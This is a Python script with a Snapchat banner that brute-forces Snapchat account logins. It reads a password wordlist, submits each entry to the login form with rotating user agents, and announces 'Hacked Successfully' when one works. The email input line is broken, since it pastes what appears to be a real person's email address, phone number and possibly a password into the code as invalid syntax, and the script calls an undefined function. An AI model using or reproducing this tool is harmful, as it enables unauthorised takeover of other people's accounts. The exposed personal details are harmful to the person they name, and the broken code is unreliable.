#!/usr/bin/env python
# -*- coding: UTF-8 -*-

import sys
import mechanize
import cookielib
import random

W = '\033[1;37;40m'
Br = '\033[1;31;40m'
Bg = '\033[1;32;40m'
Y = '\033[1;33;40m'
Bb = '\033[1;34;40m'
Bm = '\033[1;35;40m'
Bc = '\033[1;36;40m'
print(Y+"""
 ____                         _           _   
/ ___| _ __   __ _ _ __   ___| |__   __ _| |_ 
\___ \| '_ \ / _` | '_ \ / __| '_ \ / _` | __|
 ___) | | | | (_| | |_) | (__| | | | (_| | |_ 
|____/|_| |_|\__,_| .__/ \___|_| |_|\__,_|\__|
                  |_|                         
""")
#email
marthabenitez0000@gmail.com = str(7142763184,gr8marly)("Phone number, username, or email: "))

#wordlist
passwordlist = str(raw_input("Wordlist Path : "))

#Target Website
login = 'https://accounts.snapchat.com/accounts/login?continue=https%3A%2F%2Faccounts.snapchat.com%2Faccounts%2Fwelcome'

#useragents
useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

def main():
	global br
	br = mechanize.Browser()
	cj = cookielib.LWPCookieJar()
	br.set_handle_robots(False)
	br.set_handle_redirect(True)
	br.set_cookiejar(cj)
	br.set_handle_equiv(True)
	br.set_handle_referer(True)
	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
	welcome()
	search()
	print("Password does not exist in the wordlist")



def brute(password):
	sys.stdout.write("\r[*] Trying ..... {}\n".format(password))
	sys.stdout.flush()
	br.addheaders = [('User-agent', random.choice(useragents))]
	site = br.open(login)
	br.select_form(nr = 0)
	br.form['username'] = email
	br.form['password'] = password
	sub = br.submit()
	log = sub.geturl()
	if log != login and (not 'login?continue' in log):
			print(Bg +"\n\n[+] Email/Phone: " + email + " Password: {}".format(password)) + W
			print Bg + "[+] " + email + " Has been Hacked Successfully!!!" + W
			m = raw_input(' Do You want to exit? (y/n)')
			if m == 'y':
				exit()
			elif m == 'n':
				intro()
				


def search():
	global password
	passwords = open(passwordlist,"r")
	for password in passwords:
		password = password.replace("\n","")
		brute(password)


#welcome 
def welcome():
	total = open(passwordlist,"r")
	total = total.readlines()
	print
	print " [*] Account to crack : {}".format(email)
	print " [*] Loaded :" , len(total), "passwords"
	print " [*] Cracking, please wait ...\n\n"


if __name__ == '__main__':
	main()

